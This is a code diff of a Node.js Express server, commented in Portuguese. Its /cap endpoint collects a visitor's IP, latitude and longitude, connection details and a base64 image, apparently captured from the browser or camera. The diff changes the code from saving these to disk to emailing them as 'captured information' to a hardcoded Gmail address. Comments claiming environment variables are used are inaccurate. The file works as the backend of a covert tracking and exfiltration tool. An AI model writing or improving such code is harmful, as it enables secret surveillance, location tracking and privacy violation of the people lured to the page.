@@ -1,20 +1,12 @@
 const express = require("express");
-const fs = require("fs");
-const path = require("path");
-const requestIp = require("request-ip");
 const nodemailer = require("nodemailer");
+const requestIp = require("request-ip");
 
 const app = express();
 const PORT = 3000;
 
 app.use(express.json({ limit: "10mb" }));
 app.use(express.static("public"));
-
-// Verificar e criar o diretório 'img' caso não exista
-const imgDir = path.join(__dirname, "img");
-if (!fs.existsSync(imgDir)) {
-  fs.mkdirSync(imgDir);
-}
 
 // Configuração do Nodemailer
 const transporter = nodemailer.createTransport({
@@ -29,16 +21,18 @@ const transporter = nodemailer.createTransport({
 });
 
 // Função para enviar e-mail
-function sendEmail(ip, location, connection, imagePath) {
+function sendEmail(ip, location, connection, imageBuffer) {
   const mailOptions = {
-    from: "asaserroa@gmail.com", // Substitua pelo seu e-mail
-    to: "asaserroa@gmail.com", // Substitua pelo seu destinatário
+    from: "asaserroa@gmail.com", // Usando variável de ambiente
+    to: "asaserroa@gmail.com", // Usando variável de ambiente
     subject: "Informações Capturadas - Endpoint /cap",
     text: `Informações Capturadas:
     IP: ${ip}`,
     attachments: [
       {
-        path: imagePath, // Caminho da imagem anexada
+        filename: `${Date.now()}.png`, // Nome do arquivo
+        content: imageBuffer, // Conteúdo do arquivo
+        encoding: "base64", // Codificação para enviar como base64
       },
     ],
   };
@@ -46,7 +40,6 @@ function sendEmail(ip, location, connection, imagePath) {
   console.log("Enviando e-mail...");
 
   transporter.sendMail(mailOptions, (error, info) => {
-    console.log("Informações Capturadas:", ip, location, connection);
     if (error) {
       console.log("Erro ao enviar e-mail:", error);
     } else {
@@ -61,37 +54,27 @@ app.post("/cap", (req, res) => {
   const { image, location, connection } = req.body;
 
   // Log IP
-  fs.appendFileSync("logs.txt", `IP: ${ip}\n`);
+  console.log(`IP: ${ip}`);
 
   // Log localização se disponível
   if (location) {
-    fs.appendFileSync(
-      "logs.txt",
-      `Localização: Latitude ${location.latitude}, Longitude ${location.longitude}\n`
+    console.log(
+      `Localização: Latitude ${location.latitude}, Longitude ${location.longitude}`
     );
   }
 
   // Log informações de conexão se disponíveis
   if (connection) {
-    fs.appendFileSync(
-      "logs.txt",
-      `Conexão: Tipo ${connection.effectiveType}, Downlink ${connection.downlink}, RTT ${connection.rtt}\n`
+    console.log(
+      `Conexão: Tipo ${connection.effectiveType}, Downlink ${connection.downlink}, RTT ${connection.rtt}`
     );
   }
 
-  // Salvar imagem se disponível e retornar o caminho
-  let imagePath = null;
+  // Converter imagem para buffer e enviar no e-mail
   if (image) {
     const imageBuffer = Buffer.from(image.split(",")[1], "base64");
-    const imageName = `${Date.now()}.png`;
-    imagePath = path.join(imgDir, imageName);
-    fs.writeFileSync(imagePath, imageBuffer);
+    sendEmail(ip, location, connection, imageBuffer); // Envia a imagem como anexo
   }
-
-  console.log("Informações capturadas:", ip, location, connection);
-
-  console.log("Informações capturadas:", ip, location, connection);
-  sendEmail(ip, location, connection, imagePath);
 
   res.send({ status: "success", ip });
 });
